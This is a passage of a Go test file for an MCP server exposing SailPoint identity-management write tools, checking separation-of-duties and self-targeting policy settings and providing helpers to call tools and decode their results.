	if err != nil {
		t.Fatalf("ParseAndValidatePolicyBytes(sailpoint-write-policy.json) failed: %v", err)
	}
	if pol.Tools["create_access_request"] == nil || pol.Tools["create_access_request"].SoDBinding == nil {
		t.Fatalf("expected create_access_request with sod_binding in sailpoint-write-policy.json")
	}
	if pol.Tools["create_access_request"].ForbidSelfTarget == nil || !*pol.Tools["create_access_request"].ForbidSelfTarget {
		t.Fatalf("expected create_access_request to have forbid_self_target: true")
	}
	if pol.Tools["disable_account"] == nil {
		t.Fatalf("expected disable_account in sailpoint-write-policy.json")
	}
	if pol.Tools["disable_account"].ForbidSelfTarget == nil || *pol.Tools["disable_account"].ForbidSelfTarget {
		t.Fatalf("expected disable_account to have forbid_self_target: false")
	}
}

func callWriteTool[Out any](t *testing.T, c *Client, name string, args any) Out {
	t.Helper()
	res := callWriteToolRaw(t, c, name, args)
	if res.IsError {
		t.Fatalf("%s tool error: %v", name, resultText(res))
	}
	b, err := json.Marshal(res.StructuredContent)
	if err != nil {
		t.Fatal(err)
	}
	var out Out
	if err := json.Unmarshal(b, &out); err != nil {
		t.Fatalf("decode %s: %v\n%s", name, err, b)
	}
	return out
}

func callWriteToolRaw(t *testing.T, c *Client, name string, args any) *mcp.CallToolResult {
	t.Helper()
	session := connect(t, NewServerWithOptions(c, true))
	res, err := session.CallTool(context.Background(), &mcp.CallToolParams{Name: name, Arguments: args})
	if err != nil {
		t.Fatal(err)
	}
	return res
}

func resultText(res *mcp.CallToolResult) string {
	if res == nil {
		return ""
	}
	var parts []string
	for _, c := range res.Content {
		if tc, ok := c.(*mcp.TextContent); ok {
			parts = append(parts, tc.Text)
		}
	}
	return strings.Join(parts, "\n")
}

